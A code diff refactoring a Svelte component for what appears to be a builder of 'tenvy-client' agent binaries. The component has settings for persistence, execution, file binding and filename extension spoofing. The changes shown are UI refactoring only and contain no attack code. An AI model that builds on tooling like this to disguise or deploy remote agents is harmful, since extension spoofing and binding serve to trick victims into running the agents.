@@ -1,5 +1,4 @@
 <script lang="ts">
-	import { resolve } from '$app/paths';
 	import { Badge } from '$lib/components/ui/badge/index.js';
 	import { Button } from '$lib/components/ui/button/index.js';
 	import {
@@ -30,7 +29,7 @@
 		Trash2,
 		Wand2
 	} from '@lucide/svelte';
-	import { onDestroy } from 'svelte';
+	import { onDestroy, type Snippet } from 'svelte';
 
 	type BuildStatus = 'idle' | 'running' | 'success' | 'error';
 
@@ -126,6 +125,8 @@
 	let fileIconData = $state<string | null>(null);
 	let fileIconError = $state<string | null>(null);
 	let generatedSecret = $state<string | null>(null);
+
+	let SplashPreview!: Snippet<[{ className?: string }]>;
 	let secretCopyState = $state<'idle' | 'copied' | 'error'>('idle');
 	let secretCopyTimeout: ReturnType<typeof setTimeout> | null = null;
 	let buildWarnings = $state<string[]>([]);
@@ -218,7 +219,7 @@
 	let binderFileData = $state<string | null>(null);
 	let activeTab = $state<'connection' | 'persistence' | 'execution' | 'presentation'>('connection');
 
-	const sanitizedOutputBase = $derived(() => {
+	const sanitizedOutputBase = $derived.by(() => {
 		const trimmed = outputFilename.trim();
 		if (!trimmed) {
 			return 'tenvy-client';
@@ -235,7 +236,7 @@
 		return sanitized || 'tenvy-client';
 	});
 
-	const activeSpoofExtension = $derived(() => {
+	const activeSpoofExtension = $derived.by(() => {
 		if (!extensionSpoofingEnabled) {
 			return '';
 		}
@@ -250,25 +251,23 @@
 	});
 
 	const effectiveOutputFilename = $derived(
-		() => `${sanitizedOutputBase}${activeSpoofExtension}${outputExtension}`
+		`${sanitizedOutputBase}${activeSpoofExtension}${outputExtension}`
 	);
 
-	const normalizedSplashTitle = $derived(() => splashTitle.trim() || defaultSplashScreen.title);
-	const normalizedSplashSubtitle = $derived(() => splashSubtitle.trim());
-	const normalizedSplashMessage = $derived(
-		() => splashMessage.trim() || defaultSplashScreen.message
-	);
-	const normalizedSplashBackground = $derived(() =>
+	const normalizedSplashTitle = $derived(splashTitle.trim() || defaultSplashScreen.title);
+	const normalizedSplashSubtitle = $derived(splashSubtitle.trim());
+	const normalizedSplashMessage = $derived(splashMessage.trim() || defaultSplashScreen.message);
+	const normalizedSplashBackground = $derived(
 		normalizeHexColor(splashBackgroundColor, defaultSplashScreen.background)
 	);
-	const normalizedSplashAccent = $derived(() =>
+	const normalizedSplashAccent = $derived(
 		normalizeHexColor(splashAccentColor, defaultSplashScreen.accent)
 	);
-	const normalizedSplashText = $derived(() =>
+	const normalizedSplashText = $derived(
 		normalizeHexColor(splashTextColor, defaultSplashScreen.text)
 	);
 	const splashLayoutLabel = $derived(
-		() => splashLayoutOptions.find((option) => option.value === splashLayout)?.label ?? 'Centered'
+		splashLayoutOptions.find((option) => option.value === splashLayout)?.label ?? 'Centered'
 	);
 
 	const isWindowsTarget = $derived(targetOS === 'windows');
@@ -1107,6 +1106,45 @@
 </script>
 
 <div class="mx-auto w-full space-y-6 px-4 pb-10">
+	{#snippet SplashPreview({ className = '' }: { className?: string })}
+		<div
+			class={`overflow-hidden rounded-lg border border-border/60 ${className}`}
+			style={`background:${normalizedSplashBackground};color:${normalizedSplashText};`}
+		>
+			{#if splashLayout === 'split'}
+				<div class="flex flex-col sm:flex-row">
+					<div
+						class="h-2 w-full sm:h-auto sm:w-2"
+						style={`background:${normalizedSplashAccent};`}
+					></div>
+					<div class="flex-1 space-y-3 px-6 py-8 text-left sm:px-8">
+						{#if normalizedSplashSubtitle}
+							<p class="text-xs font-semibold tracking-wide uppercase opacity-80">
+								{normalizedSplashSubtitle}
+							</p>
+						{/if}
+						<h4 class="text-xl font-semibold">{normalizedSplashTitle}</h4>
+						<p class="text-sm leading-relaxed opacity-80">{normalizedSplashMessage}</p>
+					</div>
+				</div>
+			{:else}
+				<div class="flex flex-col items-center gap-3 px-6 py-8 text-center">
+					<div
+						class="h-1.5 w-16 rounded-full"
+						style={`background:${normalizedSplashAccent};`}
+					></div>
+					<h4 class="text-lg font-semibold">{normalizedSplashTitle}</h4>
+					{#if normalizedSplashSubtitle}
+						<p class="text-xs font-semibold tracking-wide uppercase opacity-80">
+							{normalizedSplashSubtitle}
+						</p>
+					{/if}
+					<p class="text-sm leading-relaxed opacity-80">{normalizedSplashMessage}</p>
+				</div>
+			{/if}
+		</div>
+	{/snippet}
+
 	<Card>
 		<CardHeader class="space-y-4">
 			<div class="flex flex-wrap items-center justify-between gap-3">
@@ -1133,44 +1171,6 @@
 			</p>
 		</CardHeader>
 		<CardContent class="space-y-8">
-			{#snippet SplashPreview({ className = '' })}
-				<div
-					class={`overflow-hidden rounded-lg border border-border/60 ${className}`}
-					style={`background:${normalizedSplashBackground};color:${normalizedSplashText};`}
-				>
-					{#if splashLayout === 'split'}
-						<div class="flex flex-col sm:flex-row">
-							<div
-								class="h-2 w-full sm:h-auto sm:w-2"
-								style={`background:${normalizedSplashAccent};`}
-							/>
-							<div class="flex-1 space-y-3 px-6 py-8 text-left sm:px-8">
-								{#if normalizedSplashSubtitle}
-									<p class="text-xs font-semibold tracking-wide uppercase opacity-80">
-										{normalizedSplashSubtitle}
-									</p>
-								{/if}
-								<h4 class="text-xl font-semibold">{normalizedSplashTitle}</h4>
-								<p class="text-sm leading-relaxed opacity-80">{normalizedSplashMessage}</p>
-							</div>
-						</div>
-					{:else}
-						<div class="flex flex-col items-center gap-3 px-6 py-8 text-center">
-							<div
-								class="h-1.5 w-16 rounded-full"
-								style={`background:${normalizedSplashAccent};`}
-							/>
-							<h4 class="text-lg font-semibold">{normalizedSplashTitle}</h4>
-							{#if normalizedSplashSubtitle}
-								<p class="text-xs font-semibold tracking-wide uppercase opacity-80">
-									{normalizedSplashSubtitle}
-								</p>
-							{/if}
-							<p class="text-sm leading-relaxed opacity-80">{normalizedSplashMessage}</p>
-						</div>
-					{/if}
-				</div>
-			{/snippet}
 			<div class="grid gap-8 xl:grid-cols-[minmax(0,2.35fr)_minmax(0,1fr)]">
 				<div class="space-y-8">
 					<Tabs bind:value={activeTab} class="space-y-6">
@@ -1995,7 +1995,7 @@
 													<span
 														class="h-3 w-3 rounded-full border border-border/70"
 														style={`background:${normalizedSplashAccent};`}
-													/>
+													></span>
 												</span>
 											</div>
 											{@render SplashPreview({
@@ -2188,7 +2188,7 @@
 												<span>Download:</span>
 												<a
 													class="font-medium text-primary underline"
-													href={resolve(downloadUrl)}
+													href={downloadUrl}
 													rel="external"
 													target="_blank"
 													download>agent binary</a
@@ -2207,10 +2207,8 @@
 										</p>
 										<pre
 											class="mt-2 max-h-48 overflow-auto rounded-md bg-muted/40 p-3 font-mono text-xs">
-                                                                                        {buildLog.join(
-												'\n'
-											)}
-                                                                                </pre>
+                                                {buildLog.join('\n')}
+										</pre>
 									</div>
 								{/if}
 								{#if generatedSecret}
